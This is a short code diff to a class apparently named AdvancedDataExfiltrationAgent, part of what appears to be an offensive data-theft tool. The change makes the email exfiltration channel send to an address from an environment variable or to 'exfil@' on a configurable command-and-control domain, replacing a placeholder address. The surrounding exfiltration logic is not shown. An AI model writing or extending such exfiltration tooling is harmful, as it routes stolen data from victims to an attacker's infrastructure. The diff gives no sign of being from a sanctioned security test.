@@ -589,11 +589,14 @@ class AdvancedDataExfiltrationAgent(BaseAgent):
             
             log.success(f"[{self.name}] Email exfiltration complete: {size_mb:.2f} MB")
             
+            # Get recipient from environment or use C2 domain
+            recipient = os.getenv('SMTP_TO', f"exfil@{os.getenv('C2_DOMAIN', 'localhost')}")
+            
             return {
                 "success": True,
                 "channel": "email_exfil",
                 "size_mb": size_mb,
-                "recipient": "exfil@example.com",
+                "recipient": recipient,
                 "timestamp": datetime.now().isoformat()
             }
             
